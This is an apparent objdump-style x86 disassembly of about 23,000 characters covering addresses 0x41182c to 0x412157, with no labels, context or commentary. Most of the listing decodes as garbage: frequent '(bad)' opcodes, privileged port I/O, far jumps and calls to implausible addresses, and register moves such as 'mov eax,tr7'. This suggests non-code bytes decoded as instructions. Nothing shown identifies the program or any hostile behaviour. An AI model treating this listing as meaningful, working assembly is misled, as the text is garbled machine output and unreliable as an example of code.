  41182c:	jns    0x411879
  41182e:	dec    edi
  41182f:	sar    DWORD PTR [edx],cl
  411831:	fiadd  DWORD PTR [ecx]
  411833:	mov    DWORD PTR ss:[edi+0x69],ecx
  411837:	jmp    0x2644ea3f
  41183c:	dec    ecx
  41183d:	imul   BYTE PTR [esi]
  41183f:	test   al,0x3a
  411841:	sti    
  411842:	mov    edi,0x74463c9d
  411847:	adc    DWORD PTR [edx+0x3700309d],edx
  41184d:	mov    edx,0x30e9
	...
  411862:	add    BYTE PTR [eax],al
  411864:	daa    
  411865:	aaa    
  411866:	imul   al
  411868:	test   ah,ch
  41186a:	(bad)  
  41186b:	jmp    DWORD PTR [edi+0x3]
  41186e:	and    BYTE PTR [ecx+0x20],al
  411871:	rol    BYTE PTR [ebx-0x4],0x10
  411875:	add    eax,DWORD PTR [eax]
  411877:	add    BYTE PTR [ebp+0x7a50fa87],dl
  41187d:	cld    
  41187e:	imul   eax,DWORD PTR [edx],0xfefe264f
  411884:	and    eax,DWORD PTR [eax]
  411886:	call   DWORD PTR ds:0x40e7d7
  41188c:	fcmovnb st,st(2)
  41188e:	or     eax,0xfffc6984
  411893:	call   FWORD PTR [edi-0x2fdf297a]
  411899:	add    al,BYTE PTR [eax]
  41189b:	(bad)  
  41189c:	pop    ebp
  41189d:	sbb    BYTE PTR [eax],al
  41189f:	add    BYTE PTR [eax-0x638c00fe],ah
  4118a5:	mov    DWORD PTR [ebx-0x20],0x8f062d27
  4118ac:	pop    ebp
  4118ad:	loopne 0x411874
  4118af:	inc    ebp
  4118b0:	call   0x914118b0
  4118b5:	mov    edi,0x290ec43
  4118ba:	add    BYTE PTR [eax],al
  4118bc:	pop    ds
  4118bd:	xchg   esi,ebp
  4118bf:	add    BYTE PTR [eax+0x2],ah
  4118c2:	add    bh,al
  4118c4:	popf   
  4118c5:	mov    dh,0xfe
  4118c7:	inc    DWORD PTR [eax]
	...
  4118d9:	add    BYTE PTR [eax],al
  4118db:	add    BYTE PTR [eax+0x2],dl
  4118de:	lea    eax,[ebp+0x28]
  4118e1:	mov    ebp,?
  4118e3:	jne    0x4118f9
  4118e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e6:	sub    al,0x4
  4118e8:	push   eax
  4118e9:	add    cl,BYTE PTR [ebx]
  4118eb:	sar    BYTE PTR [ecx],0x65
  4118ee:	jmp    0x4074:0x3ebb482
  4118f5:	dec    dh
  4118f7:	repz mov dh,0x5c
  4118fa:	int    0x28
  4118fc:	js     0x411955
  4118fe:	aas    
  4118ff:	inc    esp
  411900:	in     eax,dx
  411901:	pop    eax
  411902:	add    al,BYTE PTR [eax]
  411904:	cmp    DWORD PTR [edx],esi
  411906:	inc    esi
  411908:	jl     0x411895
  41190a:	add    al,BYTE PTR [eax]
  41190c:	cmp    DWORD PTR [edi+0x47],edx
  41190f:	je     0x411906
  411911:	ss in  eax,dx
  411913:	add    bl,BYTE PTR [esi]
  411915:	sbb    BYTE PTR [ebx+ecx*1],al
  411918:	stc    
  411919:	or     ebp,edx
  41191b:	out    0xc2,eax
  41191d:	test   DWORD PTR [edi-0x2],eax
  411920:	mov    edx,0x782d4b54
  411925:	push   edi
  411926:	add    dh,BYTE PTR [edi+edi*1+0x66]
  41192a:	in     eax,dx
  41192b:	cli    
  41192c:	prefetchnta BYTE PTR [edi+eax*8]
  411930:	cmp    al,0xec
  411932:	sbb    al,BYTE PTR [ecx+0x39]
  411935:	pop    eax
  411936:	add    al,BYTE PTR [eax]
  411938:	mov    ecx,0x39d3c5da
  41193d:	inc    ebx
  41193e:	sti    
  41193f:	inc    BYTE PTR [eax]
	...
  411951:	add    BYTE PTR [eax],al
  411953:	add    BYTE PTR [ebx+ecx*8],cl
  411956:	inc    edi
  411957:	je     0x4118e6
  411959:	scas   eax,DWORD PTR es:[edi]
  41195a:	sub    eax,0x47573902
  41195f:	je     0x4119de
  411961:	mov    edi,0x57390043
  411966:	inc    esi
  411967:	xor    bh,BYTE PTR [ecx-0x80]
  41196a:	inc    edi
  41196b:	(bad)  
  41196c:	pushw  es
  41196e:	push   ebp
  41196f:	lods   eax,DWORD PTR ds:[esi]
  411970:	and    DWORD PTR [esi-0x9],edx
  411973:	test   BYTE PTR [ebx],bl
  411975:	push   ss
  411976:	dec    eax
  411977:	inc    dl
  411979:	add    BYTE PTR [edx],al
  41197b:	std    
  41197c:	arpl   bp,si
  41197e:	arpl   ax,sp
  411980:	cmp    al,0x45
  411982:	adc    eax,0xe900398b
  411987:	add    ecx,DWORD PTR [esi-0x72bbd057]
  41198d:	jns    0x41199b
  41198f:	test   dl,bh
  411991:	inc    ebx
  411992:	sub    ch,0x1e
  411995:	shr    al,0x4b
  411998:	mov    bh,bh
  41199a:	test   eax,0xd1009047
  41199f:	xor    eax,0x5be90038
  4119a4:	hlt    
  4119a5:	or     esi,ecx
  4119a7:	inc    edi
  4119a8:	(bad)  
  4119a9:	push   0xffffffb9
  4119ab:	inc    edi
  4119ac:	out    0xd7,eax
  4119ae:	cdq    
  4119af:	push   ss
  4119b0:	js     0x4119b2
  4119b2:	inc    ecx
  4119b3:	sti    
  4119b4:	and    eax,0x5be8bf
	...
  4119c9:	add    BYTE PTR [eax],al
  4119cb:	add    BYTE PTR ds:0x5e47a609,bh
  4119d1:	jmp    0xdcffdea3
  4119d6:	xor    al,0x16
  4119d8:	clc    
  4119d9:	inc    DWORD PTR [eax-0x7aba8fba]
  4119df:	fmul   QWORD PTR [edi+0x11042815]
  4119e5:	sbb    eax,esp
  4119e7:	les    edx,FWORD PTR [esi-0x71f582a4]
  4119ed:	inc    esp
  4119ee:	shr    BYTE PTR [esi+0x51],1
  4119f1:	mov    edi,0x1701dbe8
  4119f6:	test   al,0x3
  4119f8:	popa   
  4119f9:	pop    edi
  4119fa:	adc    al,BYTE PTR [edi+0x6f]
  4119fd:	xlat   BYTE PTR ds:[ebx]
  4119fe:	xor    DWORD PTR [esi],edx
  411a00:	clc    
  411a01:	call   eax
  411a03:	arpl   WORD PTR [edx],dx
  411a05:	mov    edi,0x2ff2e8ff
  411a0a:	cmp    DWORD PTR [esi],ebp
  411a0c:	neg    ah
  411a0e:	das    
  411a0f:	sar    BYTE PTR [ebp+0x44],1
  411a12:	sbb    WORD PTR ds:0x7b00ffbf,bx
  411a19:	or     edi,edi
  411a1b:	push   cs
  411a1c:	(bad)  
  411a1d:	cli    
  411a1e:	stc    
  411a1f:	push   es
  411a20:	jle    0x411a7d
  411a22:	xor    al,0x3
  411a24:	jbe    0x411a68
  411a26:	or     ch,BYTE PTR [ecx]
  411a28:	jmp    0x8421021b
  411a2d:	inc    edx
  411a2e:	(bad)  
  411a2f:	repnz add BYTE PTR [eax],al
	...
  411a42:	add    BYTE PTR [eax],al
  411a44:	jp     0x411a15
  411a46:	or     DWORD PTR [esi+0x284bf939],esp
  411a4c:	cmp    eax,0x3ae90001
  411a51:	fadd   DWORD PTR [eax]
  411a53:	call   0xd7291a92
  411a58:	dec    edx
  411a59:	inc    ebx
  411a5a:	dec    BYTE PTR [edx-0x16bf496d]
  411a60:	bsf    edi,ebx
  411a63:	call   0x6c411aa5
  411a68:	stc    
  411a69:	inc    edi
  411a6a:	dec    edi
  411a6b:	xchg   esi,eax
  411a6c:	dec    ecx
  411a6d:	mov    bh,0x4a
  411a6f:	sub    BYTE PTR ds:0x3aeb6858,dh
  411a75:	add    BYTE PTR [ebx],cl
  411a77:	test   eax,0xbcfeec89
  411a7c:	shl    DWORD PTR [esi+0x2cf2e940],cl
  411a82:	cs data16 (bad) 
  411a85:	cmp    DWORD PTR [edx+esi*4],eax
  411a88:	ret    
  411a89:	sar    bh,0xe8
  411a8c:	cmp    al,BYTE PTR [eax]
  411a8e:	add    BYTE PTR [ecx+0x54],al
  411a91:	or     eax,0xa6ff00ff
  411a96:	add    al,0x33
  411a98:	pop    ds
  411a99:	mov    edx,0x3d475666
  411a9e:	(bad)  
  411a9f:	out    0x63,eax
  411aa1:	scas   al,BYTE PTR es:[edi]
  411aa2:	std    
  411aa3:	dec    DWORD PTR [ecx]
  411aa5:	mov    esi,0x8b53
	...
  411aba:	add    BYTE PTR [eax],al
  411abc:	sub    al,0x27
  411abe:	add    eax,0xf7fee0e9
  411ac3:	jb     0x411ae6
  411ac5:	mov    esi,0xa7106afd
  411aca:	mov    eax,0xb7ff1001
  411acf:	add    BYTE PTR [eax],ah
  411ad1:	(bad)  
  411ad2:	dec    eax
  411ad4:	bound  eax,QWORD PTR [ebx-0x2]
  411ad7:	xor    DWORD PTR [bx+0x3e],esp
  411adc:	sbb    BYTE PTR [esi],ch
  411ade:	inc    edx
  411ae0:	mov    eax,tr7
  411ae3:	call   0xa4291708
  411ae8:	sar    esi,1
  411aea:	jmp    edi
  411aec:	call   0xf0c8:0xf8fffdb9
  411af3:	call   FWORD PTR [edi-0x600aed5d]
  411af9:	mov    esp,0xbca5fce6
  411afe:	std    
  411aff:	or     DWORD PTR [ebp-0x5fbeb5bb],0xfffffffe
  411b06:	jae    0x411b21
  411b08:	adc    edi,ebx
  411b0a:	cli    
  411b0b:	cs push ecx
  411b0d:	cld    
  411b0e:	push   DWORD PTR [ebx-0x5a]
  411b11:	mov    ebx,0x3dcefb13
  411b16:	inc    dh
  411b18:	xchg   ebp,eax
  411b19:	xor    DWORD PTR [edi],esp
  411b1b:	inc    ecx
  411b1c:	nop
  411b1d:	std    
  411b1e:	(bad)  
  411b1f:	inc    DWORD PTR [eax]
	...
  411b31:	add    BYTE PTR [eax],al
  411b33:	add    BYTE PTR [ecx],bh
  411b35:	fstp   DWORD PTR [ebx-0x3a]
  411b38:	jb     0x411aeb
  411b3a:	inc    esp
  411b3b:	out    0x71,eax
  411b3d:	mov    esp,0x307afe44
  411b42:	int3   
  411b43:	call   0x718b7441
  411b48:	cmp    BYTE PTR [esi],dl
  411b4a:	inc    ebp
  411b4b:	out    0x2e,eax
  411b4d:	pop    eax
  411b4e:	add    al,BYTE PTR [eax]
  411b50:	rcr    DWORD PTR [ebx-0x57],cl
  411b53:	sub    cl,BYTE PTR [ebx]
  411b55:	jecxz  0x411ba9
  411b57:	xor    BYTE PTR [ebx],0x5c
  411b5a:	int    0x1
  411b5c:	adc    dl,BYTE PTR [esi+0x57]
  411b5f:	jmp    0x16:0xfe44db11
  411b66:	ins    BYTE PTR es:[edi],dx
  411b67:	test   BYTE PTR [esi],0x53
  411b6a:	fdivr  st,st(7)
  411b6c:	push   ds
  411b6d:	in     al,dx
  411b6e:	add    al,BYTE PTR [eax]
  411b70:	cmp    DWORD PTR [edx],esp
  411b72:	sbb    eax,0x4189094
  411b77:	call   DWORD PTR [edi+ecx*8]
  411b7a:	test   eax,0x1d3a3940
  411b7f:	pushf  
  411b80:	sbb    BYTE PTR [eax],0x4
  411b83:	call   FWORD PTR [edi+esi*2]
  411b86:	test   eax,0x1d923940
  411b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b8c:	pusha  
  411b8d:	sbb    BYTE PTR [edi+edi*8],al
  411b90:	adc    al,0xaf
  411b92:	test   eax,0x1d6a3940
  411b97:	lods   al,BYTE PTR ds:[esi]
	...
  411bac:	adc    BYTE PTR [eax],bl
  411bae:	add    al,0xff
  411bb0:	pop    esp
  411bb1:	pop    es
  411bb2:	stos   BYTE PTR es:[edi],al
  411bb3:	inc    eax
  411bb4:	cmp    edx,eax
  411bb6:	sbb    eax,0x417f0b4
  411bbb:	call   DWORD PTR [edi+ecx*1-0x56]
  411bbf:	inc    eax
  411bc0:	cmp    DWORD PTR [eax],eax
  411bc2:	pushw  ds
  411bc4:	mov    ebp,0x7603a7a7
  411bc9:	sbb    ebp,DWORD PTR [ecx]
  411bcb:	stos   BYTE PTR es:[edi],al
  411bcc:	stc    
  411bcd:	dec    DWORD PTR [ebp+0x1e]
  411bd0:	jge    0x411b79
  411bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bd3:	add    ebx,DWORD PTR [esi+0x1b]
  411bd6:	xor    DWORD PTR [edx+0x1e35fff9],ebp
  411bdc:	jge    0x411b85
  411bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bdf:	add    eax,DWORD PTR [esi+0x1b]
  411be2:	cmp    DWORD PTR [edx+0x1e1dfff9],ebp
  411be8:	or     eax,0x2e03a7a7
  411bed:	sbb    esi,DWORD PTR [ecx]
  411bef:	stos   BYTE PTR es:[edi],al
  411bf0:	jns    0x411bf2
  411bf2:	push   es
  411bf3:	push   ds
  411bf4:	std    
  411bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bf7:	add    edx,DWORD PTR [esi]
  411bf9:	sbb    ecx,DWORD PTR [ecx]
  411bfb:	stos   BYTE PTR es:[edi],al
  411bfc:	jns    0x411bfe
  411bfe:	out    dx,al
  411bff:	sbb    eax,0x427a71d
  411c04:	(bad)  
  411c05:	sbb    dl,cl
  411c07:	fnstsw WORD PTR [ecx+0x0]
  411c0a:	(bad)  
  411c0b:	jmp    0x468c2f2
	...
  411c24:	out    0x1a,al
  411c26:	mov    ecx,0xbe0079dd
  411c2b:	jmp    0x468c2fa
  411c30:	into   
  411c31:	sbb    dh,BYTE PTR [ecx-0x59ff8623]
  411c37:	jmp    0x468c2fe
  411c3c:	mov    dh,0x1a
  411c3e:	jmp    0x8e411620
  411c43:	jmp    0x468c282
  411c48:	sahf   
  411c49:	sbb    dh,cl
  411c4b:	(bad)  
  411c4d:	(bad)  
  411c4e:	push   DWORD PTR [ebp-0x60]
  411c51:	hlt    
  411c52:	pop    ecx
  411c53:	sub    BYTE PTR ds:0x5cf92441,bh
  411c59:	mov    edi,0xec605dff
  411c5e:	pop    ecx
  411c5f:	test   al,0x3a
  411c61:	inc    ecx
  411c62:	and    al,0xf1
  411c64:	test   BYTE PTR [edi-0x1bafba01],bh
  411c6a:	pop    ecx
  411c6b:	test   al,0x3a
  411c6d:	inc    ecx
  411c6e:	and    al,0x9
  411c70:	outs   dx,DWORD PTR ds:[esi]
  411c71:	mov    edi,0x1c502dff
  411c76:	pop    edx
  411c77:	test   al,0x3a
  411c79:	inc    ecx
  411c7a:	and    al,0xd1
  411c7c:	adc    al,0xc1
  411c7e:	call   DWORD PTR ds:0xa859ec20
  411c84:	cmp    bh,BYTE PTR [edi]
  411c86:	and    al,0xb9
	...
  411c9c:	cld    
  411c9d:	sar    bh,0xfd
  411ca0:	and    esp,esi
  411ca2:	pop    ecx
  411ca3:	test   al,0x3a
  411ca5:	aas    
  411ca6:	and    al,0xb1
  411ca8:	in     al,0xc0
  411caa:	jmp    ebp
  411cac:	adc    esp,edi
  411cae:	pop    ecx
  411caf:	sub    BYTE PTR ds:0xf29243f,bh
  411cb5:	sar    edi,0xcd
  411cb8:	rol    ebx,1
  411cba:	pop    ecx
  411cbb:	sub    BYTE PTR ds:0xf731243f,dh
  411cc1:	sar    bh,0xb5
  411cc4:	loope  0x411c91
  411cc6:	pop    ecx
  411cc7:	sub    BYTE PTR ds:0xdf39243f,bh
  411ccd:	sar    bh,0x9d
  411cd0:	mov    eax,ds:0x352859d3
  411cd5:	aas    
  411cd6:	and    al,0x31
  411cd8:	xchg   eax,eax
  411cda:	(bad)  
  411cdb:	push   DWORD PTR [edi+0x615a5a28]
  411ce1:	add    al,0xff
  411ce3:	and    eax,0x3f5e40
  411ce8:	pop    ss
  411ce9:	sub    BYTE PTR [esi+0x5a],ah
  411cec:	rol    DWORD PTR [ebx],1
  411cee:	jmp    DWORD PTR ds:0x3f5d84
  411cf4:	pop    es
  411cf5:	sub    BYTE PTR [esi+0x5a],ch
  411cf8:	xchg   ecx,eax
  411cf9:	add    edi,edi
  411cfb:	and    eax,0x3f5d9c
	...
  411d14:	pop    ss
  411d15:	sub    BYTE PTR [esi+0x5a],dh
  411d18:	mov    eax,ds:0x9425ff03
  411d1d:	pop    ebp
  411d1e:	aas    
  411d1f:	add    BYTE PTR [edi],dl
  411d21:	sub    BYTE PTR [edx-0xfd1ea6],al
  411d27:	and    eax,0x3f5d94
  411d2c:	aaa    
  411d2d:	sub    BYTE PTR [esi-0xfd2ea6],cl
  411d33:	and    eax,0x3f5d6c
  411d38:	pop    es
  411d39:	daa    
  411d3a:	xchg   esi,eax
  411d3b:	pop    edx
  411d3c:	rol    DWORD PTR [edx],1
  411d3e:	jmp    DWORD PTR ds:0x3f5db4
  411d44:	pop    ss
  411d45:	daa    
  411d46:	sahf   
  411d47:	pop    edx
  411d48:	and    DWORD PTR [edi+edi*8],eax
  411d4b:	and    eax,0x3f5dbc
  411d50:	mul    DWORD PTR [esi]
  411d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d53:	pop    edx
  411d54:	and    DWORD PTR [edi+edi*8],eax
  411d57:	and    eax,0x3f5db4
  411d5c:	xchg   edi,eax
  411d5d:	es scas al,BYTE PTR es:[edi]
  411d5f:	pop    edx
  411d60:	adc    DWORD PTR [edi+edi*8],eax
  411d63:	and    eax,0x3f5e18
  411d68:	cmp    DWORD PTR [esi-0x17fc401a],edx
  411d6e:	add    edi,edi
  411d70:	push   esp
  411d71:	ins    DWORD PTR es:[edi],dx
  411d72:	fld    QWORD PTR [eax+0x39]
  411d75:	mov    esi,0xcbe6
	...
  411d8a:	add    BYTE PTR [eax],al
  411d8c:	repz out 0x3,eax
  411d8f:	call   FWORD PTR [ecx+ebx*4-0x23]
  411d93:	inc    eax
  411d94:	cmp    DWORD PTR [esi+0x6813d3e6],esp
  411d9a:	add    bh,bh
  411d9c:	adc    al,0xf1
  411d9e:	fld    QWORD PTR [eax+0x39]
  411da1:	into   
  411da2:	out    0xdb,al
  411da4:	add    ebp,DWORD PTR [eax+0x2]
  411da7:	call   FWORD PTR [ecx+ecx*8]
  411daa:	fld    QWORD PTR [eax+0x39]
  411dad:	mul    dh
  411daf:	out    0xe3,eax
  411db1:	addr16 add bh,bh
  411db4:	adc    al,0x15
  411db6:	fiadd  WORD PTR [eax+0x39]
  411db9:	push   ds
  411dba:	out    0xef,eax
  411dbc:	xchg   ebx,eax
  411dbd:	push   0x135cff02
  411dc2:	fiadd  WORD PTR [eax+0x39]
  411dc5:	push   es
  411dc6:	out    0xf7,eax
  411dc8:	jae    0x411e32
  411dca:	add    bh,bh
  411dcc:	push   esp
  411dcd:	xor    ebx,esp
  411dcf:	inc    eax
  411dd0:	cmp    DWORD PTR [esi],ebp
  411dd2:	in     eax,0xff
  411dd4:	arpl   ax,bp
  411dd6:	add    edi,edi
  411dd8:	sbb    al,0x23
  411dda:	fild   DWORD PTR [eax+0x39]
  411ddd:	push   esi
  411dde:	in     eax,0x7
  411de0:	sub    al,0x3
  411de3:	call   DWORD PTR [ebx+esi*1]
  411de6:	fild   DWORD PTR [eax+0x39]
  411de9:	jle    0x411dd0
  411deb:	adc    esi,DWORD PTR [edx-0x18]
  411dee:	add    edi,edi
	...
  411e04:	sbb    al,0x4f
  411e06:	fild   DWORD PTR [eax+0x39]
  411e09:	add    BYTE PTR [ebp-0x53b37db1],dh
  411e0f:	dec    edi
  411e10:	or     BYTE PTR [ecx+eiz*2-0x39],0x5a
  411e15:	add    al,0x6a
  411e17:	cmp    edi,DWORD PTR [eax]
  411e19:	mov    ebx,0x1a7bf0
  411e1e:	jmp    0xe9459926
  411e23:	test   BYTE PTR [esi-0x3ef413fc],cl
  411e29:	add    ch,cl
  411e2b:	add    edi,DWORD PTR [ecx]
  411e2d:	inc    edx
  411e2e:	in     al,0x3
  411e30:	mov    edx,0x3ebee038
  411e35:	js     0x411e1b
  411e37:	add    edi,DWORD PTR [ecx]
  411e39:	add    BYTE PTR [ebx],ch
  411e3b:	pop    es
  411e3c:	cmp    DWORD PTR [ecx+0x7cc1340],eax
  411e42:	jno    0x411e4d
  411e44:	cmp    DWORD PTR [eax],eax
  411e46:	jmp    0x6a415890
  411e4b:	cmp    edx,DWORD PTR [esi-0x45]
  411e4e:	lock jnp 0x411e87
  411e51:	add    cl,ch
  411e53:	add    edi,ebx
  411e55:	add    ebp,ecx
  411e57:	test   BYTE PTR [esi],ah
  411e59:	rol    BYTE PTR [ebx-0x16f62ef5],0x3
  411e60:	cmp    DWORD PTR [edx-0x14],eax
  411e63:	add    eax,DWORD PTR [eax+eax*4-0x18]
  411e67:	add    eax,DWORD PTR [eax]
	...
  411e79:	add    BYTE PTR [eax],al
  411e7b:	add    BYTE PTR [ecx],bh
  411e7d:	mov    ebx,0x427bf0
  411e82:	jmp    0xe945198a
  411e87:	add    BYTE PTR [ecx],bh
  411e89:	(bad)  
  411e8a:	call   0x81497a92
  411e8f:	push   cs
  411e90:	cmp    DWORD PTR [eax],eax
  411e92:	jmp    0x4158d8
  411e97:	hlt    
  411e98:	cmp    al,BYTE PTR [edx]
  411e9a:	add    cl,ch
  411e9c:	stc    
  411e9d:	add    al,0xb8
  411e9f:	stc    
  411ea0:	cmp    al,BYTE PTR [eax]
  411ea2:	add    BYTE PTR [ebx-0x16c2ffbf],ch
  411ea8:	add    BYTE PTR ds:[eax],al
  411eab:	or     al,0x2d
  411ead:	js     0x411ec0
  411eaf:	jmp    0xe6031eee
  411eb4:	cmp    bh,bl
  411eb6:	jmp    eax
  411eb8:	cmp    al,BYTE PTR [eax]
  411eba:	jge    0x411e9d
  411ebc:	add    dl,BYTE PTR [ecx]
  411ebe:	add    cl,ch
  411ec0:	cmp    al,BYTE PTR [edx+0x3]
  411ec3:	jmp    0xe9511f01
  411ec8:	cmp    bh,BYTE PTR [ebx+0x479107]
  411ece:	add    cl,ch
  411ed0:	clc    
  411ed1:	add    BYTE PTR [eax],al
  411ed3:	cld    
  411ed4:	cmp    ah,al
  411ed6:	(bad)  
  411ed7:	call   0xd1f92355
  411edc:	cmp    al,BYTE PTR [eax]
  411ede:	add    BYTE PTR [ebx],ch
	...
  411ef4:	inc    ecx
  411ef5:	add    BYTE PTR ds:0xfe3bfae9,bh
  411efb:	xchg   esp,eax
  411efc:	xor    bh,BYTE PTR [eax+0x19]
  411eff:	jmp    0xee031f3e
  411f04:	cmp    bh,ch
  411f06:	jmp    FWORD PTR [eax+0x35]
  411f09:	add    BYTE PTR [ebp-0x1f],bh
  411f0c:	adc    BYTE PTR [edi],0x0
  411f0f:	jmp    0xe9445d4e
  411f14:	jmp    0x411f5e
  411f16:	cmp    al,0xe9
  411f18:	cmp    al,BYTE PTR [ecx]
  411f1a:	add    dh,ah
  411f1c:	cdq    
  411f1d:	inc    eax
  411f1e:	mov    WORD PTR ds:0x8b1a2c,ds
  411f24:	mov    eax,ds:0x630002c1
  411f29:	test   BYTE PTR [edx],bl
  411f2b:	add    al,0xd0
  411f2d:	(bad)  
  411f2e:	(bad)  
  411f2f:	jne    0x411f1e
  411f31:	xchg   BYTE PTR [edi+0x10],bh
  411f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f35:	(bad)  
  411f36:	dec    DWORD PTR [eax+0x41721]
  411f3c:	nop
  411f3d:	aas    
  411f3e:	lds    eax,FWORD PTR [ecx+0x38c]
  411f44:	mov    bh,bh
  411f46:	(bad)  
  411f47:	dec    DWORD PTR [ecx]
  411f49:	test   BYTE PTR [esi],cl
  411f4b:	add    al,0x90
  411f4d:	inc    DWORD PTR [edx+0x3747c]
  411f53:	mov    ebp,ecx
  411f55:	push   ss
  411f56:	add    al,0x0
	...
  411f6c:	pusha  
  411f6d:	jae    0x411f78
  411f6f:	mov    dl,BYTE PTR [ecx+0x1]
  411f72:	sar    dh,0x10
  411f75:	xchg   edi,edi
  411f77:	shl    DWORD PTR [edi+edi*8-0x31],0x21
  411f7c:	and    al,BYTE PTR [ebx]
  411f7e:	add    BYTE PTR [ebx+0x41ad1],al
  411f84:	push   eax
  411f85:	cli    
  411f86:	jae    0x411fa5
  411f88:	stos   DWORD PTR es:[edi],eax
  411f89:	test   BYTE PTR [esi],cl
  411f8b:	add    al,0x20
  411f8d:	dec    DWORD PTR [eax+0x32881]
  411f93:	add    al,dl
  411f95:	sar    DWORD PTR [edi+0x1c],0x24
  411f99:	(bad)  
  411f9a:	inc    DWORD PTR [edi]
  411f9c:	and    bh,bh
  411f9e:	dec    DWORD PTR [eax+0x40f91]
  411fa4:	adc    BYTE PTR [esi-0x11be779],al
  411faa:	dec    edi
  411fac:	inc    ecx
  411fad:	rol    DWORD PTR [ecx+0x6353981],0x0
  411fb4:	cmp    DWORD PTR [edx-0x4a],ecx
  411fb7:	sbb    al,0xc2
  411fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fba:	adc    eax,DWORD PTR [ecx+edi*1]
  411fbd:	sub    DWORD PTR [ecx+0x22d2180],ecx
  411fc3:	add    BYTE PTR [ecx+0x62],bh
  411fc6:	sbb    BYTE PTR [ebx],0x3d
  411fc9:	sub    DWORD PTR [edx],eax
  411fcb:	or     BYTE PTR [ecx],bh
  411fcd:	sub    DWORD PTR [edx],eax
  411fcf:	mov    DWORD PTR [eax],eax
	...
  411fe1:	add    BYTE PTR [eax],al
  411fe3:	add    BYTE PTR [eax+0x39000638],bh
  411fe9:	sahf   
  411fea:	mov    dl,BYTE PTR [edi]
  411fec:	cmp    eax,0x388a0229
  411ff1:	daa    
  411ff2:	inc    edx
  411ff3:	std    
  411ff4:	jns    0x411f96
  411ff6:	add    al,bl
  411ff8:	mov    dl,0xe4
  411ffa:	out    0x3,eax
  411ffc:	ret    0xe67c
  411fff:	add    eax,DWORD PTR [ebx+esi*2]
  412002:	shl    DWORD PTR [edx],cl
  412004:	outs   dx,DWORD PTR ds:[esi]
  412005:	mov    ds:0xd0b3ffca,eax
  41200a:	and    dh,0x38
  41200d:	sbb    BYTE PTR [eax*2-0x7d2cab44],ch
  412014:	inc    ecx
  412015:	daa    
  412016:	mov    bl,0xef
  412018:	mov    edx,0x36bd02fa
  41201d:	jecxz  0x41205b
  41201f:	(bad)  
  412020:	mov    esp,0xab74099c
  412025:	jbe    0x411fae
  412027:	(bad)  
  412028:	cmp    al,al
  41202a:	pop    ds
  41202b:	add    al,0x39
  41202d:	daa    
  41202e:	mov    ch,0x18
  412030:	ret    0x13a8
  412033:	add    al,0x39
  412035:	daa    
  412036:	mov    DWORD PTR [eax+0x22321],eax
  41203c:	jns    0x41203e
  41203e:	jo     0x4120ba
  412040:	push   edx
  412041:	add    al,0xe9
  412043:	add    esi,DWORD PTR [eax+0x7f87f]
	...
  412059:	add    BYTE PTR [eax],al
  41205b:	add    BYTE PTR [ecx],bh
  41205d:	add    BYTE PTR [edx-0x7e],ah
  412060:	cs add al,0xe9
  412063:	add    eax,edi
  412065:	ds out 0xb7,eax
  412068:	xor    BYTE PTR [esi+0x3ae201d0],al
  41206e:	test   eax,0xea254e8b
  412073:	push   ebx
  412074:	dec    esi
  412075:	dec    DWORD PTR [edi+0x1f]
  412078:	cmp    eax,0x41b6e900
  41207d:	test   DWORD PTR [edi+0x13],esp
  412080:	cmp    eax,0xb98ae900
  412085:	sbb    ch,ah
  412087:	add    edi,DWORD PTR [ecx]
  412089:	rcr    BYTE PTR [edi+0x7a],0x22
  41208d:	add    al,0xe9
  41208f:	add    eax,eax
  412091:	jg     0x41208b
  412093:	pop    es
  412094:	cmp    DWORD PTR [eax],eax
  412096:	jb     0x41201a
  412098:	dec    esi
  412099:	add    al,0xe9
  41209b:	add    esi,DWORD PTR [ebx+0x5458eb18]
  4120a1:	cmp    eax,0x2abb2917
  4120a6:	out    0x8b,eax
  4120a8:	cs mov bl,0x5a
  4120ab:	fdivr  DWORD PTR [ecx]
  4120ad:	addr16 int3 
  4120af:	pop    es
  4120b0:	cmp    DWORD PTR [eax],eax
  4120b2:	pushf  
  4120b3:	sbb    al,dl
  4120b5:	jle    0x4120af
  4120b7:	pop    es
  4120b8:	cmp    DWORD PTR [eax],eax
  4120ba:	pusha  
  4120bb:	add    BYTE PTR [esi+0x4],0xe9
  4120bf:	add    eax,DWORD PTR [eax]
	...
  4120d1:	add    BYTE PTR [eax],al
  4120d3:	add    BYTE PTR [ecx-0x79],bh
  4120d6:	aas    
  4120d7:	pop    ds
  4120d8:	xor    eax,0xb98ae900
  4120dd:	verw   bp
  4120e0:	cmp    al,BYTE PTR [eax]
  4120e2:	mov    ebp,DWORD PTR [eax+0x52]
  4120e5:	add    al,0x0
  4120e7:	jmp    0x55416014
  4120ec:	aaa    
  4120ed:	xchg   BYTE PTR [edi],cl
  4120ef:	jmp    0x412075
  4120f1:	cmp    eax,ecx
  4120f3:	popa   
  4120f4:	sub    eax,0xd5990125
  4120f9:	jmp    FWORD PTR [eax-0x1c73923]
  4120ff:	cmp    al,0x1c
  412101:	test   DWORD PTR [eax-0x1c74927],eax
  412107:	jo     0x4120bd
  412109:	adc    BYTE PTR [ecx+ebp*8],al
  41210c:	cmp    al,al
  41210e:	mov    BYTE PTR [eax+0x41],dl
  412111:	add    al,0x0
  412113:	jmp    0xed50a0dd
  412118:	cmp    al,BYTE PTR [eax]
  41211a:	mov    esi,DWORD PTR [eax+0x25]
  41211d:	add    al,0x0
  41211f:	jmp    0xfa0010e
  412124:	nop
  412125:	ds add ebp,ecx
  412128:	xchg   ebx,edx
  41212a:	mov    cl,ch
  41212c:	xchg   BYTE PTR [eax],cl
  41212e:	push   esi
  41212f:	sbb    dh,ch
  412131:	rol    DWORD PTR [edx+0x4b2424c],1
  412137:	test   BYTE PTR [eax],al
	...
  412149:	add    BYTE PTR [eax],al
  41214b:	add    BYTE PTR [edx+0x0],al
  41214e:	add    cl,ch
  412150:	mov    bh,0xb4
  412152:	and    ebx,ebp
  412154:	scas   eax,DWORD PTR es:[edi]
  412155:	xor    DWORD PTR [edx],ebp
  412157:	xor    al,0xc0
